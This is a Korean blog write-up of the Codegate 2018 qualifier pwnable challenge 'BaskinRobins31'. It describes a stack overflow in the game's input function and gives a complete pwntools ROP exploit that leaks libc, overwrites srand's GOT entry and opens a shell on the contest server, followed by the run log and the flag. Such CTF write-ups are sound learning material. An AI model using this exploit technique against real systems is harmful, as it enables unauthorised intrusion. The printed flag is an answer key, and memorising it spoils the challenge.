---
layout: post
title: "Codegate 2018 Quals BaskinRobins31"
img: /img/codegate2018/BaskinRobins31/postimg.png
date: 2018-03-14 19:54:05 +0900
description: Codegate 2018 Quals Pwnable BaskinRobins31 Write-up
categories: Codegate Pwnable Writeup
---
# Codegate 2018 Prequal Pwnable BaskinRobins31

## 개요

```
BaskinRobins31 - 217pts (Pwn)
nc ch41l3ng3s.codegate.kr 3131
Solve 30
```

[Download](https://s3.ap-northeast-2.amazonaws.com/codegate2018/4b9a5f57118bcfb6db1d0991af9e4159)

> 다운로드가 안된다면 [이곳](https://github.com/sunghun7511/Writeup/blob/master/ctf/codegate/2018-Prequal/Pwnable/BaskinRobins31/4b9a5f57118bcfb6db1d0991af9e4159)에서 해주세요!

(`Junior` 으로 참가하여서 일반부와는 문제의 점수가 다를 수 있습니다.)

## 풀이

먼저 받은 파일의 압축을 풀고 나니 `BaskinRobins31` 라는 바이너리가 있었다.

IDA 헥스레이로 열어 분석을 하였다.

이 바이너리는 한 때 유행했었던 31게임이 코딩되어 있었다.

취약점은 사용자의 턴에 숫자를 입력받기 위해 호출하는 `your_turn` 함수 안에서 쉽게 찾을 수 있었다.

![source](https://github.com/sunghun7511/Writeup/raw/master/ctf/codegate/2018-Prequal/Pwnable/BaskinRobins31/source.png)

`s` 변수는 `0xA0` 만큼의 공간이지만, 매우 넉넉하게 `0x190` 만큼을 입력받는다.

간단하게 64비트 `GOT Overwrite ROP` 페이로드를 짜면 된다.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

심지어 `checksec`를 통해 보호기법들을 확인해보면 카나리도 없다.

`bss` 영역에 `/bin/sh\x00` 문자열을 넣어놓고, `srand` 함수의 `GOT`를 덮어썼다.

(대회 초반에 긴장해서 32비트처럼 풀다가 안돼서 고생좀 했다 ㅋㅋㅋ;;)

립씨 릭을 해봤더니 서버의 립씨는 `libc6_2.23-0ubuntu9_amd64` 였다.

```python
from pwn import *

context.arch = "amd64"
# context.log_level = "DEBUG"

e = ELF("./BaskinRobins31")

isRemote = True

if isRemote:
    p = remote("ch41l3ng3s.codegate.kr", 3131)
else:
    p = process("./BaskinRobins31")
    attach(p, "b *0x0000000000400979\nc")

    raw_input("wait..")

p.recvuntil("### The one that take the last match win ###\n")

read_got = 0x0
pppr = next(e.search(asm("pop rdi; pop rsi; pop rdx; ret")))
pr = next(e.search(asm("pop rdi; ret")))

payload = ""

payload += "4\x00" + "A"*0xB6

payload += flat(pppr, 0x0, e.bss(), 0x8, e.plt["read"])
payload += flat(pr, e.got["puts"], e.plt["puts"])
payload += flat(pppr, 0x0, e.got["srand"], 0x8, e.plt["read"])
payload += flat(pr, e.bss(), e.plt["srand"])

p.sendlineafter("? (1-3)\n", payload)

p.recvuntil("rules...:( \n")

p.send("/bin/sh\x00")

recv = p.recv()[:-1]
puts_got = u64(recv + "\x00"*(8-len(recv)))
print("[*] puts_got is " + hex(puts_got))

# libc6_2.23-0ubuntu9_amd64
p.send(p64(puts_got - 0x6f690 + 0x45390))

p.interactive()
```

이를 실행하면 리모트 환경에서도 쉘이 제대로 따졌다.

```
shgroup@ubuntu:/mnt/hgfs/Writeup/ctf/codegate/2018-Prequal/Pwnable/BaskinRobins31$ python solve.py 
[*] '/mnt/hgfs/Writeup/ctf/codegate/2018-Prequal/Pwnable/BaskinRobins31/BaskinRobins31'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to ch41l3ng3s.codegate.kr on port 3131: Done
[*] puts_got is 0x7f588403a690
[*] Switching to interactive mode
$ ls
BaskinRobins31
flag
$ cat flag
flag{The Korean name of "Puss in boots" is "My mom is an alien"}
$  
```

## Flag

`The Korean name of "Puss in boots" is "My mom is an alien"`